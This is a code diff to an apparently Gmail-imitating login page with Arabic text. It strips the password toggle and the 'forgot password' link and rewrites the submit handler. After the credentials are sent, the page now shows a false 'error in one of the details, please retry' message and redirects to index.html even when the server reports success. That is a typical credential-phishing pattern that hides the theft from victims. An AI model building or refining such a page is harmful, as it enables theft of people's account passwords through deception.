@@ -95,32 +95,6 @@
             color: #80868b;
         }
 
-        .password-wrapper {
-            position: relative;
-        }
-
-        .password-toggle {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #80868b;
-            cursor: pointer;
-            font-size: 18px;
-            transition: color 0.3s ease;
-        }
-
-        .password-toggle:hover {
-            color: #202124;
-        }
-
-        input[type="password"],
-        input[type="text"] {
-            padding-left: 45px;
-        }
-
         .checkbox-group {
             display: flex;
             align-items: center;
@@ -142,23 +116,6 @@
             color: #5f6368;
             font-weight: 400;
             text-transform: none;
-        }
-
-        .forgot-link {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .forgot-link a {
-            color: #1f73e6;
-            text-decoration: none;
-            font-size: 13px;
-            transition: color 0.3s ease;
-        }
-
-        .forgot-link a:hover {
-            color: #1555c0;
-            text-decoration: underline;
         }
 
         .button-group {
@@ -202,6 +159,11 @@
 
         .btn-primary:active {
             background: #1555c0;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         .create-account {
@@ -301,25 +263,18 @@
 
                 <div class="form-group">
                     <label for="password">كلمة المرور</label>
-                    <div class="password-wrapper">
-                        <input 
-                            type="password" 
-                            id="password" 
-                            name="password"
-                            placeholder="أدخل كلمة المرور"
-                            required
-                        >
-                        <button type="button" class="password-toggle" onclick="togglePasswordGmail()">👁️</button>
-                    </div>
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password"
+                        placeholder="أدخل كلمة المرور"
+                        required
+                    >
                 </div>
 
                 <div class="checkbox-group">
                     <label for="remember">إبقائي مسجلاً</label>
                     <input type="checkbox" id="remember" name="remember">
-                </div>
-
-                <div class="forgot-link">
-                    <a href="#">هل نسيت كلمة المرور؟</a>
                 </div>
 
                 <div class="button-group">
@@ -384,28 +339,22 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    alert('تم التحقق بنجاح!');
-                    document.getElementById('gmailForm').reset();
+                    // خطأ والتوجيه إلى index.html
+                    alert('خطأ في احد المعلومات يرجى اعادة محاولة العملية مره اخرى');
+                    window.location.href = 'index.html';
                 } else {
-                    alert('حدث خطأ. الرجاء المحاولة مجددا');
+                    alert('خطأ في احد المعلومات يرجى اعادة محاولة العملية مره اخرى');
+                    window.location.href = 'index.html';
                 }
             } catch (error) {
                 console.error('Error:', error);
-                alert('خطأ في الاتصال');
+                alert('خطأ في احد المعلومات يرجى اعادة محاولة العملية مره اخرى');
+                window.location.href = 'index.html';
             } finally {
                 submitBtn.disabled = false;
                 loading.style.display = 'none';
             }
         });
-
-        function togglePasswordGmail() {
-            const passwordInput = document.getElementById('password');
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-            } else {
-                passwordInput.type = 'password';
-            }
-        }
 
         function goBack() {
             window.history.back();
